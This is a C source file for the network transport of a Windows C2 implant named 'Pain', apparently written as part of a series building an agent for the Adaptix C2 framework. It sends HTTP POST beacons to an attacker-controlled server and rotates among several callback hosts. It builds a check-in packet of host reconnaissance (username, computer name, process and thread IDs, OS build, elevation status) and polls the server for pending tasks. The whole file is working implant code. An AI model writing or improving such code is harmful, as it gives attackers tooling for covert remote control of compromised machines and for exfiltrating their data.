#include <windows.h>
#include <wininet.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>

// Send a raw buffer to the C2 over HTTP POST.
DECLFN BOOL Transport_Send( PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len )
{
    G_AGENT;
    Self->Ntdll.DbgPrint( "[Pain] Transport_Send() %d bytes\n", data_len );

    // ── 1. Pick the active callback ───────────────────────────────────────────
    PCHAR       host;
    UINT16      port;
    BOOL        ssl;
    PCHAR       ua;
    CHAR        legacy_uri[] = { '/', 0 };
    PCHAR       uri;
    PAIN_HEADER* hdrs;
    UINT32       hdr_count;

    if ( Self->Config.CallbackCount > 0 ) {
        UINT32 idx = Self->Config.CallbackIndex;
        host      = Self->Config.Callbacks[idx].Host;
        port      = Self->Config.Callbacks[idx].Port;
        ssl       = Self->Config.Callbacks[idx].Ssl;
        ua        = Self->Config.Callbacks[idx].UserAgent;
        uri       = Self->Config.Callbacks[idx].Uri;
        hdrs      = Self->Config.Callbacks[idx].Headers;
        hdr_count = Self->Config.Callbacks[idx].HeaderCount;
    } else {
        // Legacy single-host mode
        host      = Self->Config.Host;
        port      = Self->Config.Port;
        ssl       = Self->Config.Ssl;
        ua        = Self->Config.UserAgent;
        uri       = legacy_uri;
        hdrs      = nullptr;
        hdr_count = 0;
    }

    // 2. Reconnect if the active callback changed
    if ( Self->Config.CallbackCount > 0 &&
         Self->Config.CallbackIndex != Self->Config.ActiveCallbackIdx )
    {
        Self->Ntdll.DbgPrint( "[Pain] Switching callback %d → %d\n",
                              Self->Config.ActiveCallbackIdx, Self->Config.CallbackIndex );
        if ( Self->WinInet.InetConnect ) {
            Http_Close( Self->WinInet.InetConnect );
            Self->WinInet.InetConnect = nullptr;
        }
        if ( Self->WinInet.InetSession ) {
            Http_Close( Self->WinInet.InetSession );
            Self->WinInet.InetSession = nullptr;
        }
        Self->Config.ActiveCallbackIdx = Self->Config.CallbackIndex;
    }

    // 3. Open session / connection handles if not already open
    if ( !Self->WinInet.InetSession ) {
        Self->WinInet.InetSession = Http_Open( ua );
        if ( !Self->WinInet.InetSession ) {
            goto on_failure;
        }
        Self->Ntdll.DbgPrint( "[Pain] Http_Open = 0x%p\n", Self->WinInet.InetSession );
    }

    if ( !Self->WinInet.InetConnect ) {
        Self->WinInet.InetConnect = Http_Connect( Self->WinInet.InetSession, host, port );
        if ( !Self->WinInet.InetConnect ) {
            Http_Close( Self->WinInet.InetSession );
            Self->WinInet.InetSession = nullptr;
            goto on_failure;
        }
        Self->Ntdll.DbgPrint( "[Pain] Http_Connect = 0x%p\n", Self->WinInet.InetConnect );
    }

    // 4. Send the request
    {
        BOOL ok = Http_Send( Self->WinInet.InetConnect, uri, ssl,
                             hdrs, hdr_count,
                             data, data_len, out_buf, out_len );
        if ( !ok ) {
            Http_Close( Self->WinInet.InetConnect );
            Http_Close( Self->WinInet.InetSession );
            Self->WinInet.InetConnect = nullptr;
            Self->WinInet.InetSession = nullptr;
            goto on_failure;
        }

        // 5. Rotate on success
        if ( Self->Config.CallbackCount > 1 ) {
            switch ( Self->Config.RotationStrategy ) {
            case 0: // round-robin
                Self->Config.CallbackIndex =
                    ( Self->Config.CallbackIndex + 1 ) % Self->Config.CallbackCount;
                break;
            case 1: // random - LCG: Numerical Recipes constants
                Self->Config.RngState =
                    Self->Config.RngState * 1664525u + 1013904223u;
                Self->Config.CallbackIndex =
                    Self->Config.RngState % Self->Config.CallbackCount;
                break;
            default: // failover (2) - stay on current host
                break;
            }
        }

        return TRUE;
    }

on_failure:
    // Advance to the next callback so we try a different host next beacon cycle.
    if ( Self->Config.CallbackCount > 1 ) {
        Self->Config.CallbackIndex =
            ( Self->Config.CallbackIndex + 1 ) % Self->Config.CallbackCount;
    }
    return FALSE;
}

// Build and send the check-in packet - registers Pain with the Adaptix C2
// The Go plugin's CreateAgent() on Day 10 will parse this exact field order
DECLFN BOOL Transport_Checkin()
{
    G_AGENT;

    Self->Ntdll.DbgPrint( "[Pain] Checkin() start - host=%s port=%d\n",
                        Self->Config.Host, Self->Config.Port );

    // AgentID must be exactly 36 bytes - the server reads this before decryption
    // to know which plugin handles this packet
    PPACKAGE pkg = Pkg_Create( Self->Config.AgentUUID );
    if ( !pkg ) return FALSE;

    // 0xF1 = check-in magic - server-side plugin checks this first byte to confirm
    // this is a fresh registration, not a task result or poll
    Pkg_Int32( pkg, 0xF1 );

    // machine info - everything the C2 UI will display about this agent
    // fallback stack strings - "?" literals would live in .rdata which is stripped
    CHAR unk[] = { '?', 0 };

    UINT32 user_len = 0;
    PCHAR  username = Self->Machine.Username ? Self->Machine.Username : unk;
    while ( username[user_len] ) user_len++;
    Pkg_Bytes( pkg, username, user_len );

    UINT32 comp_len = 0;
    PCHAR  computer = Self->Machine.Computer ? Self->Machine.Computer : unk;
    while ( computer[comp_len] ) comp_len++;
    Pkg_Bytes( pkg, computer, comp_len );

    Pkg_Int32( pkg, (INT32)Self->Session.ProcessID );
    Pkg_Int32( pkg, (INT32)Self->Session.ThreadID  );
    Pkg_Int32( pkg, (INT32)Self->Config.Sleep       );
    Pkg_Int32( pkg, (INT32)Self->Machine.OsMajor    );
    Pkg_Int32( pkg, (INT32)Self->Machine.OsMinor    );
    Pkg_Int32( pkg, (INT32)Self->Machine.OsBuild    );
    Pkg_Int32( pkg, (INT32)Self->Machine.Elevated   );

    // Process name (basename of ImagePathName - appended last so the layout stays additive)
    {
        CHAR   unk2[]   = { '?', 0 };
        PCHAR  procname = Self->Machine.ProcessName ? Self->Machine.ProcessName : unk2;
        UINT32 plen     = 0;
        while ( procname[plen] ) plen++;
        Pkg_Bytes( pkg, procname, plen );
    }

    // Pkg_Transmit handles auth prefix insertion + encryption, then calls Transport_Send
    PVOID  resp      = nullptr;
    UINT32 resp_size = 0;
    BOOL   ok        = Pkg_Transmit( pkg, &resp, &resp_size );

    if ( resp ) Heap_Free( resp );
    Pkg_Destroy( pkg );

    if ( ok ) {
        Self->Session.Connected = TRUE;
#if PAIN_AUTH_MODE != 0
        // After the first auth check-in the server recognises the key and registers
        // the session.  Subsequent Pkg_Transmit calls must NOT re-send the prefix.
        if ( !Self->Session.Authenticated )
            Self->Session.Authenticated = TRUE;
#endif
    }

    return ok;
}

// Ask the C2 if there are any pending tasks for this agent
// Sends an empty packet (just the AgentID header) and returns the raw response
DECLFN BOOL Transport_Poll( PVOID* out_buf, UINT32* out_len )
{
    G_AGENT;

    // empty poll packet - just the 36-byte AgentID, no payload to encrypt
    PPACKAGE pkg = Pkg_Create( Self->Config.AgentUUID );
    if ( !pkg ) return FALSE;

    PVOID  resp      = nullptr;
    UINT32 resp_size = 0;
    BOOL   ok        = Pkg_Transmit( pkg, &resp, &resp_size );

    Pkg_Destroy( pkg );

    if ( ok && resp_size > 0 ) {
        *out_buf = resp;
        *out_len = resp_size;
    } else {
        if ( resp ) Heap_Free( resp );
        *out_buf = nullptr;
        *out_len = 0;
    }

    return ok;
}
